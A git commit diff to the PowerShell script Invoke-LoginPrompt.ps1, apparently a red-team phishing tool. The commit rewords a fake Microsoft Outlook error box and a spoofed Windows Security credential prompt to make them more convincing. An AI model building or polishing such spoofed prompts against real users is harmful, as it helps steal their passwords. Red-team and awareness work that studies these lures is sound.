01af909c21b641c6c54edef7e50003adcf08c320
BaffledJimmy <tommac2005@gmail.com>
2018-07-10 16:38:35 +0100

    Update Invoke-LoginPrompt.ps1

--- Invoke-LoginPrompt.ps1
+++ Invoke-LoginPrompt.ps1
@@ -18,9 +18,9 @@ function Invoke-LoginPrompt{
 
     [void] [System.Reflection.Assembly]::LoadWithPartialName("System.Drawing")
     [void] [System.Reflection.Assembly]::LoadWithPartialName("System.Windows.Forms")
-    [System.Windows.Forms.MessageBox]::Show("Outlook cannot log on.  Verify you are connected to the network and are using the proper server and mailbox name. The Microsoft Exchange information service in your profile is missing required information. Modify your profile to ensure that you are using the correct Microsoft Exchange information service.","Microsoft Outlook",[System.Windows.Forms.MessageBoxButtons]::OK,[System.Windows.Forms.MessageBoxIcon]::Warning)
+    [System.Windows.Forms.MessageBox]::Show("Outlook cannot log on to the Exchange Server.  Verify you are connected to the network and are using the proper server and mailbox name. The Microsoft Exchange information service in your profile is missing information required to authenticate. Modify your profile to ensure that you are using the correct Microsoft Exchange information service.","Microsoft Outlook",[System.Windows.Forms.MessageBoxButtons]::OK,[System.Windows.Forms.MessageBoxIcon]::Warning)
 
-    $cred = $Host.ui.PromptForCredential("Windows Security", "Please enter user credentials", "$env:userdomain\$env:username","")
+    $cred = $Host.ui.PromptForCredential("Windows Security", "Please enter your username", "$env:userdomain\$env:username","")
     $username = "$env:username"
     $domain = "$env:userdomain"
     $full = "$domain" + "\" + "$username"
